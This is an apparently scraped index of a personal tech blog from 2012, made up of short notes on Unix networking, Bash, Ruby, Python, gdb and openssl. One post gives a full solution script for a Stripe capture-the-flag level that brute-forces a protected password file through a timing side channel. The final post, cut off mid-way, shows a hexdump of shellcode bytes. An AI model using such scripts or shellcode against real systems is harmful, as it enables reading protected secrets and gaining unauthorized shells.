<p>I found a <a href="http://stackoverflow.com/questions/4994638/one-line-ftp-server-in-python">Stackoverflow</a> post that shows Twisted has a one line FTP and
more:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ twistd -n ftp</code></pre></div>
<p>The <code>-n</code> option is for &ldquo;nodaemon&rdquo;; don&rsquo;t daemonize and run in the foreground.</p>

<p>Just looking at the options for <code>twistd</code>, it looks like you can also do
port-forwarding, SOCKS tunneling, a HTTP server, a DNS server, and more.</p>

<p><a href="http://twistedmatrix.com/trac/">http://twistedmatrix.com/trac/</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/iproute2/">iproute2</a></h2>
      <time>Apr 21, 2012</time>
      <p>I was surprised to find out that ifconfig and route are actually deprecated,
despite their ubiquity.</p>

<p>Even more unfortunate, their replacement, namely the ip command, doesn&rsquo;t seem
to have any concern for the readability of its output.</p>

<p>Here is how you would statically assign an IP, Netmask, Gateway, and DNS
servers with ifconfig and route and the equivalent commands in ip:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ifconfig eth0 up

$ ip link <span class="nb">set</span> eth0 up</code></pre></div>
<p>Configure your IP and Netmask:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ifconfig eth0 <span class="m">192</span>.168.1.3 netmask <span class="m">255</span>.255.255.0

$ ip addr add <span class="m">192</span>.168.1.3/24 dev eth0</code></pre></div>
<p>Configure a route to your default Gateway:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ route add default gw <span class="m">192</span>.168.1.1

$ ip route add default via <span class="m">192</span>.168.1.1</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/less-print/">less print</a></h2>
      <time>Apr 8, 2012</time>
      <p>Excellent point:<br />
<a href="http://inventwithpython.com/blog/2012/04/06/stop-using-print-for-debugging-a-5-minute-quickstart-guide-to-pythons-logging-module/">http://inventwithpython.com/blog/2012/04/06/stop-using-print-for-debugging-a-5-minute-quickstart-guide-to-pythons-logging-module/</a></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">logging</span>

<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">,</span> 
    <span class="n">format</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> - </span><span class="si">%(levelname)s</span><span class="s1"> - </span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;message&#39;</span><span class="p">)</span></code></pre></div>
<p>In Ruby:</p>

<p><a href="http://www.ruby-doc.org/stdlib-1.9.3/libdoc/logger/rdoc/Logger.html">http://www.ruby-doc.org/stdlib-1.9.3/libdoc/logger/rdoc/Logger.html</a></p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;logger&#39;</span>

<span class="n">log</span> <span class="o">=</span> <span class="no">Logger</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">STDOUT</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">level</span> <span class="o">=</span> <span class="no">Logger</span><span class="o">::</span><span class="no">WARN</span>

<span class="n">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;Created logger&#34;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Program started&#34;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span><span class="s2">&#34;Nothing to do!&#34;</span><span class="p">)</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/fix-slow-ssh-logins/">fix slow ssh logins</a></h2>
      <time>Apr 8, 2012</time>
      <p><a href="http://unix.stackexchange.com/questions/5621/how-to-speed-my-too-slow-ssh-login">http://unix.stackexchange.com/questions/5621/how-to-speed-my-too-slow-ssh-login</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/comparison-operator/">comparison operator</a></h2>
      <time>Mar 13, 2012</time>
      <p>Python doesn&rsquo;t have the &lt;=&gt; comparison operator, but this is the equivalent:</p>

<pre>
(a > b) - (a < b)
</pre>

<p><a href="http://docs.python.org/release/3.0.1/whatsnew/3.0.html">http://docs.python.org/release/3.0.1/whatsnew/3.0.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/streams-with-tshark/">streams with tshark</a></h2>
      <time>Mar 9, 2012</time>
      <p>Wiresharks command-line complement,  tshark, is pretty handy in a jam. You can
even extract stream numbers:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ tshark -r dump.pcap -T fields -e tcp.stream</code></pre></div>
<p>Using the stream numbers, you can be much more precise in your filters:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ tshark -r dump.pcap -T fields -e text tcp.stream eq <span class="nv">$stream</span> </code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/gdb-show-asm-on-break/">gdb show asm on break</a></h2>
      <time>Mar 7, 2012</time>
      <p>Display a number of lines:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">display /3i $pc</code></pre></div>
<p>or</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">set disassemble-next-line on</code></pre></div>
<p><a href="http://stackoverflow.com/questions/1902901/show-current-instruction-in-gdb">http://stackoverflow.com/questions/1902901/show-current-instruction-in-gdb</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/encrypt-small-files-with-ssh-keys/">encrypt small files with ssh keys</a></h2>
      <time>Mar 2, 2012</time>
      <p>Convert RSA public key and private key to PEM format:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ openssl rsa -in ~/.ssh/id_rsa -outform pem &gt; 
id_rsa.pem

$ openssl rsa -in ~/.ssh/id_rsa -pubout -outform pem &gt;
id_rsa.pub.pem</code></pre></div>
<p>Encrypting a file with your public key:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ openssl rsautl -encrypt -pubin -inkey id_rsa.pub.pem <span class="se">\
</span><span class="se"></span>-in file.txt -out file.enc</code></pre></div>
<p>Decrypting the file with your private key:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ openssl rsautl -decrypt -inkey id_rsa.pem <span class="se">\
</span><span class="se"></span>-in file.enc -out file.txt</code></pre></div>
<p>Of course, this is asymmetric encryption and your file must be less than or
equal in size to your key!</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/bash-regex-matching/">bash regex matching</a></h2>
      <time>Mar 2, 2012</time>
      <p>Incredibly, Bash allows you to do regular expression comparisons with the <code>=~</code>
operator that Ruby and Perl use:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;foo&#34;</span> <span class="o">=</span>~ f.* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> match
  <span class="k">fi</span>
 
match</code></pre></div>
<p><a href="http://tldp.org/LDP/abs/html/abs-guide.html#REGEXMATCHREF">http://tldp.org/LDP/abs/html/abs-guide.html#REGEXMATCHREF</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/level06-stripe-ctf/">level06 stripe ctf</a></h2>
      <time>Feb 29, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/env bash
</span><span class="cp"></span>
<span class="nb">ulimit</span> -f <span class="m">1</span> <span class="c1"># set file size limit to 1024 bytes
</span><span class="c1"></span>
<span class="nv">s</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
<span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> 
  <span class="k">for</span> <span class="o">((</span><span class="nv">i</span><span class="o">=</span><span class="m">32</span><span class="p">;</span> i &lt; <span class="m">127</span><span class="p">;</span> i++<span class="o">))</span><span class="p">;</span> <span class="k">do</span>
    rm f o
    <span class="nv">c</span><span class="o">=</span><span class="k">$(</span>ruby -e <span class="s2">&#34;print </span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="s2">.chr&#34;</span><span class="k">)</span>
    <span class="nv">t</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">s</span><span class="si">}${</span><span class="nv">c</span><span class="si">}</span><span class="s2">...&#34;</span>
    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">t</span><span class="si">}</span><span class="s2">&#34;</span>

    ruby -e <span class="s2">&#34;print &#39;A&#39; * (1024-33-</span><span class="si">${#</span><span class="nv">t</span><span class="si">}</span><span class="s2">+3)&#34;</span> &gt; f<span class="p">;</span>
    /levels/level06 /home/the-flag/.password <span class="s2">&#34;</span><span class="si">${</span><span class="nv">t</span><span class="si">}</span><span class="s2">&#34;</span> <span class="m">2</span>&gt;&gt;f <span class="m">1</span>&gt;o<span class="p">;</span>

    sleep <span class="m">0</span>.1 <span class="c1"># INCREASE LIBERALLY IF FALSE POSITIVES
</span><span class="c1"></span>   
    <span class="k">if</span> <span class="o">[</span> ! -s o <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="c1"># if file o is empty
</span><span class="c1"></span>      <span class="nv">s</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">s</span><span class="si">}${</span><span class="nv">c</span><span class="si">}</span><span class="s2">&#34;</span>
      <span class="nb">echo</span> -n <span class="nv">$c</span>
      <span class="nb">break</span>
    <span class="k">fi</span>
  <span class="k">done</span>
<span class="k">done</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/bash-c-style-escapes/">bash c-style escapes </a></h2>
      <time>Feb 28, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">echo</span> <span class="s1">$&#39;hello\nworld&#39;</span>
hello
world</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/open/">open</a></h2>
      <time>Feb 26, 2012</time>
      <p>Mac OS X has an <code>open</code> command-line utility that I use
extensively from the terminal. If ever I need to open a directory or any file
with its default application, I just simply type <code>open file</code> and
there is no need to open Finder and traverse to the directory.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># open a finder window in current directory
</span><span class="c1"></span>$ open . 

$ open http://google.com

$ open image.jpg</code></pre></div>
<p>In Linux, you can get the same functionality with <code>gnome-open</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ~/.bash_profile
</span><span class="c1"></span>$ <span class="nb">alias</span> <span class="nv">open</span><span class="o">=</span>gnome-open

$ open http://segv.me

<span class="c1"># open nautilus window in current directory
</span><span class="c1"></span>$ open .</code></pre></div>
<pre><code>man open
man gnome-open
</code></pre>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/canonical/">canonical</a></h2>
      <time>Feb 20, 2012</time>
      <blockquote>
<p>Reduced to the simplest and most significant form possible without loss of
generality.</p>
</blockquote>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/theory-highlights/">theory highlights</a></h2>
      <time>Feb 19, 2012</time>
      <blockquote>
<p>&ldquo;This discussion highlights an important difference between complexity theory
and computability theory. In computability theory, the Church-Turing thesis
implies that all reasonable models of computation are equivalent - that is,
they all decide the same class of languages. In complexity theory, the choice
of model affects the time complexity of languages. Languages that are decidable
in, say, linear time on one model aren&rsquo;t necessarily decidable in linear time
on another.&rdquo;</p>

<p>&ldquo;The same language may have different time requirements on different models.&rdquo;</p>

<p>&ldquo;We show that any language that is decidable on [a nondeterministic
single-tape machine] is decidable on a deterministic single-tape Turing
machine that requires significantly more time.&rdquo;</p>
</blockquote>

<p><b>
Thanks Sipser, when I&rsquo;m not being tested on the subject your book is really quite swell.
</b></p>

<p>So a NP problem only takes polynomial time on a nondeterministic Turing
machine, which has infinite parallelism. Think NFA that splits each time it
encounters multiple possible paths. Every NFA has an equivalent DFA; however,
when that NFA is converted to an equivalent DFA, the number of states may be
exponential in the number of states in the NFA.</p>

<blockquote>
<p>&ldquo;First, note the dramatic difference between the growth rate of a typically
occurring polynomials such as n<sup>3</sup> and typically occurring
exponentials such as 2<sup>n</sup>. For example, let n be 1000, the size of a
reasonable input to an algorithm. In that case, n<sup>3</sup> is 1 billion, a
large but manageable number, whereas 2<sup>n</sup> is a number much larger than
the number of atoms in the universe. Polynomial time algorithms are fast enough
for many purposes, but exponential time algorithms rarely are useful.&rdquo;</p>
</blockquote>

<p><a href="http://abstrusegoose.com/a/206.htm">http://abstrusegoose.com/a/206.htm</a>
<a href="http://www-math.mit.edu/~sipser/book.html">http://www-math.mit.edu/~sipser/book.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/coercing-expressions-to-booleans/">coercing expressions to booleans</a></h2>
      <time>Feb 14, 2012</time>
      <p>In Ruby, you may need to coerce an expression to an explicit boolean value.</p>

<p>This:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="n">b</span> <span class="o">=</span> <span class="n">defined?</span><span class="p">(</span><span class="n">foo</span><span class="p">)</span> <span class="p">?</span> <span class="kp">true</span> <span class="p">:</span> <span class="kp">false</span></code></pre></div>
<p>becomes:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">b</span> <span class="o">=</span> <span class="o">!!</span><span class="n">defined?</span><span class="p">(</span><span class="n">foo</span><span class="p">)</span></code></pre></div>
<p>That is a double not (<code>!</code>) operator.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">irb(main):001:0&gt; !!false
=&gt; false
irb():002:0&gt; !!nil
=&gt; false
irb(main):003:0&gt; !!true
=&gt; true
irb(main):</code></pre></div>
<p><a href="http://rubyrogues.com/032-rr-ruby-antipatterns/">http://rubyrogues.com/032-rr-ruby-antipatterns/</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/ruby-fiddle-1-9-3/">ruby fiddle 1.9.3</a></h2>
      <time>Feb 14, 2012</time>
      <p>After watching Peter Cooper&rsquo;s <em>Ruby Trick Shots</em> I wanted to experiment
with loading dynamic libraries in Ruby as he demoed.</p>

<p>Maddeningly, when I tried to require <code>fiddle</code>, Ruby was throwing a <code>LoadError</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">LoadError: cannot load such file -- fiddle</code></pre></div>
<p>Digging into the RVM logs in ~/.rvm/log/ruby-1.9.3-p0, I found that when RVM
compiled Ruby it failed to find the <code>ffi.h</code> header and
subsequently did not install fiddle.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ grep -A <span class="m">2</span> fiddle ~/.rvm/log/ruby-1.9.3-p0/make.log 
configuring fiddle
ffi.h is missing. Please install libffi.
...</code></pre></div>
<p>So, as usual this is a dependency problem and your solution is an apt-get away:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get install libffi5 libffi-dev</code></pre></div>
<p>Now, I can finally run Peter&rsquo;s code:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="ch">#!/usr/bin/env ruby</span>

<span class="nb">require</span> <span class="s1">&#39;fiddle&#39;</span>

<span class="n">libc</span> <span class="o">=</span> <span class="no">DL</span><span class="o">.</span><span class="n">dlopen</span> <span class="s2">&#34;libc.so.6&#34;</span>

<span class="n">f</span> <span class="o">=</span> <span class="no">Fiddle</span><span class="o">::</span><span class="no">Function</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">libc</span><span class="o">[</span><span class="s1">&#39;strlen&#39;</span><span class="o">]</span><span class="p">,</span>
                         <span class="o">[</span><span class="no">Fiddle</span><span class="o">::</span><span class="no">TYPE_VOIDP</span><span class="o">]</span><span class="p">,</span>
                         <span class="no">Fiddle</span><span class="o">::</span><span class="no">TYPE_INT</span><span class="p">)</span>

<span class="nb">p</span> <span class="n">f</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&#34;foo&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span></code></pre></div>
<p><a href="http://rubyreloaded.com/trickshots/">http://rubyreloaded.com/trickshots/</a>
<a href="http://rubydoc.info/stdlib/fiddle/frames">http://rubydoc.info/stdlib/fiddle/frames</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/tabindex/">tabindex</a></h2>
      <time>Feb 14, 2012</time>
      <p>Hey Web Developers, how about when you add a login form to a page you
<strong><em>ALWAYS</em></strong> add a <code>tagindex</code> attribute and make the username and password
fields the first elements in the tabbing order.</p>

<p>The internet thanks you, KTHXBYE.</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">p</span><span class="p"></span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;user&#34;</span><span class="p"></span><span class="p">&gt;</span>Username<span class="p">&lt;</span><span class="p">/</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">br</span> <span class="p">/</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;user&#34;</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="p">/</span><span class="nt">p</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">p</span><span class="p"></span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;pass&#34;</span><span class="p"></span><span class="p">&gt;</span>Password<span class="p">&lt;</span><span class="p">/</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">br</span> <span class="p">/</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;pass&#34;</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">&#34;2&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="p">/</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="p">/</span><span class="nt">p</span><span class="p">&gt;</span></code></pre></div>
<p><a href="http://www.w3.org/TR/html4/interact/forms.html#adef-tabindex">http://www.w3.org/TR/html4/interact/forms.html#adef-tabindex</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/drop-into-an-interactive-interpreter-from-a-script/">drop into an interactive interpreter from a script</a></h2>
      <time>Jan 30, 2012</time>
      <p>Twice this weekend I&rsquo;ve found that I would like to drop from a script into the
interactive prompt and have the environment and context available to debug and
test. Once in Ruby and once in Python.</p>

<p>I do most active development with an interpreter open, but copying and pasting
into the interpreter quickly becomes tedious.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pdb</span>
<span class="c1"># ...</span>
<span class="n">pdb</span><span class="o">.</span><span class="n">set_trace</span><span class="p">()</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;rubygems&#39;</span>
<span class="nb">require</span> <span class="s1">&#39;ruby-debug&#39;</span>
<span class="c1"># ...</span>
<span class="n">debugger</span></code></pre></div>
<p>I will certainly be using these extensively at the very least to test my
data-structures.</p>

<p><strong>Update 2012-10-11</strong></p>

<p>Alternative with Pry:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;pry&#39;</span>
<span class="c1"># ...</span>
<span class="nb">binding</span><span class="o">.</span><span class="n">pry</span></code></pre></div>
<p><a href="http://stackoverflow.com/questions/2158097/drop-into-python-interpreter-while-executing-function">http://stackoverflow.com/questions/2158097/drop-into-python-interpreter-while-executing-function</a>
<a href="http://stackoverflow.com/questions/1144560/how-do-i-drop-to-the-irb-prompt-from-a-running-script">http://stackoverflow.com/questions/1144560/how-do-i-drop-to-the-irb-prompt-from-a-running-script</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/python-unzip-idiom/">Python unzip idiom</a></h2>
      <time>Jan 30, 2012</time>
      <p>The <code>*splat</code> operator is commonly used to <strong>unzip</strong> arrays in Python:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">]</span>

<span class="o">&gt;&gt;&gt;</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
<span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">)]</span>

<span class="o">&gt;&gt;&gt;</span> <span class="nb">zip</span><span class="p">(</span><span class="o">*</span><span class="n">_</span><span class="p">)</span>
<span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">)]</span></code></pre></div>
<p>I&rsquo;ve included another trick, the _ (underscore) is a shortcut in the
interactive interpreter for the last returned value, which works in irb too and
likely many others.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/xor/">xor</a></h2>
      <time>Jan 29, 2012</time>
      <p>Note to self, stop rewriting these functions, you already have them:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="c1"># xor string str with string ciph</span>
<span class="k">def</span> <span class="nc"></span><span class="o"></span><span class="nf">xor</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">ciph</span><span class="p">)</span>
  <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">str</span><span class="o">.</span><span class="n">size</span><span class="o">.</span><span class="n">to_f</span> <span class="sr">/ ciph.size).ceil
</span><span class="sr">  z = str.bytes.zip((ciph * m).bytes)
</span><span class="sr">  z.map { |a| (a[0] ^ a[1]).chr }.join
</span><span class="sr">end
</span><span class="sr">
</span><span class="sr"># xor each byte in string str with byte
</span><span class="sr">def xor_each(str, byte)
</span><span class="sr">  str.each_byte.map { |c| (c ^ byte).chr }.join
</span><span class="sr">end</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">xor</span><span class="p">(</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x01\x01\x01</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">xor_each</span><span class="p">(</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span> <span class="mh">0x01</span><span class="o"></span><span class="p">)</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/quick-basic-auth/">quick basic auth</a></h2>
      <time>Jan 28, 2012</time>
      <p>I often go for the <code>man</code> when I wget or curl something from a site with basic
auth and completely forget I can do this:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl http://USER:PASSWORD@segv.me/some/basic/auth/protected/file</code></pre></div>
<p>Just a little faster on the draw.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/search-and-replace-continued/">search and replace continued</a></h2>
      <time>Jan 27, 2012</time>
      <p>As an extension of Recycling Arguments and the previous post on search and
replace using Sed, I would like to show two Bash features for search in replace
in previous commands:</p>

<p>Replace the first instance of foo in the previous command with bar:</p>

<pre><code>$ cat foo
$ ^foo^bar
cat bar
</code></pre>

<p>OR</p>

<pre><code>$ cat foo
$ !!:s/foo/bar
</code></pre>

<p>As you can see the second example uses the word designator with a syntax
similar to that of Sed. However, one difference is that if you&rsquo;d like to do a
&lsquo;global&rsquo; replace, you&rsquo;ll need to use the following syntax:</p>

<pre><code>$ cat /home/foo/a /home/foo/b
$ !!:gs/foo/bar
</code></pre>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/ruby-string-to_class/">ruby string.to_class</a></h2>
      <time>Jan 16, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="k">class</span> <span class="nc">String</span>
  <span class="k">def</span> <span class="nc"></span><span class="o"></span><span class="nf">to_class</span>
    <span class="no">Kernel</span><span class="o">.</span><span class="n">const_get</span><span class="p">(</span><span class="nb">self</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ruby-1.8.7-p352 :012 &gt; <span class="s2">&#34;Integer&#34;</span>.to_class
 <span class="o">=</span>&gt; Integer </code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/shuffle-lines/">shuffle lines</a></h2>
      <time>Jan 13, 2012</time>
      <p>Using Ruby&rsquo;s special stream, <strong><code>ARGF</code></strong>, shuffling the lines in a file is trivial:</p>

<pre><code>$ cat foo.txt | 
ruby -e &quot;puts ARGF.readlines.collect.shuffle rescue Errno::EPIPE&quot;
</code></pre>

<p></p></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/shell-uptime/">shell uptime</a></h2>
      <time>Jan 13, 2012</time>
      <p>Bash has many reserved variables, but one of the most fun for screen junkies is
the <strong><code>$SECONDS</code></strong> variable, which displays &ldquo;the
number of seconds since the shell was started&rdquo;.</p>

<pre><code>$ echo $SECONDS
2012339

$ echo $(($SECONDS/60)) minutes
33541 minutes

$ echo $(($SECONDS/60/60)) hours
559 hours

$ echo $(($SECONDS/60/60/24)) days 
23 days

</code></pre>

<p><a href="http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_02.html">http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_02.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/bash-extglob/">bash extglob</a></h2>
      <time>Jan 13, 2012</time>
      <p>Bash has many advanced features that may not be enabled by default, and as an
avid wildcard wielder I find <code>extglob</code> especially useful.</p>

<p>I use <strong>inverse pattern matching</strong> most frequently, for example:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ls
bar     baz     foo.jpg     quux
                   ^
$ ls !<span class="o">(</span>*.jpg<span class="o">)</span>
bar  baz  quux</code></pre></div>
<p>To enable <code>extglob</code>, simply run:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">shopt</span> -s extglob</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">  If the extglob shell option is enabled using the shopt builtin, several extended  pattern  matching  operators are recognized.  In the following description, a pattern-list is a list of one or more patterns separated by a |.  

Composite patterns may be formed using one or more of the following sub-patterns:

       ?(pattern-list)
              Matches zero or one occurrence of the given pattern               
       *(pattern-list)
              Matches zero or more occurrences of the given patterns
       +(pattern-list)
              Matches one or more occurrences of the given patterns
       @(pattern-list)
              Matches one of the given patterns
       !(pattern-list)
              Matches anything except one of the given patterns</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/python-child-reaping/">python child reaping</a></h2>
      <time>Jan 12, 2012</time>
      <p>When creating the &ldquo;hello world&rdquo; of socket programming, a forking echo
server/client, programmers often forget to reap child processes.</p>

<p>Interestingly, Wikipedia has a table of code for automatically reaping children
in several different languages.</p>

<p>In Python it is rather simple using the standard <code>SIG_IGN</code> handler:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_IGN</span><span class="p">)</span></code></pre></div>
<p><a href="http://docs.python.org/library/signal.html">http://docs.python.org/library/signal.html</a>
<a href="http://en.wikipedia.org/wiki/SIGCHLD">http://en.wikipedia.org/wiki/SIGCHLD</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/hexdump/">hexdump</a></h2>
      <time>Jan 12, 2012</time>
      <p>Often, when developing shellcode you&rsquo;ll want to dump a file in the backslash
hex notation (e.g. \x0A), but hexdump by default outputs input offset, space
delimited hex, and ascii representations:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ hexdump -C shellcode
<span class="m">00000000</span>  <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> c9 <span class="m">99</span> b0  a4 <span class="nb">cd</span> <span class="m">80</span> 6a 0b <span class="m">58</span> <span class="m">51</span> <span class="m">68</span>  <span class="p">|</span><span class="m">1</span>.1.1......j.XQh<span class="p">|</span>
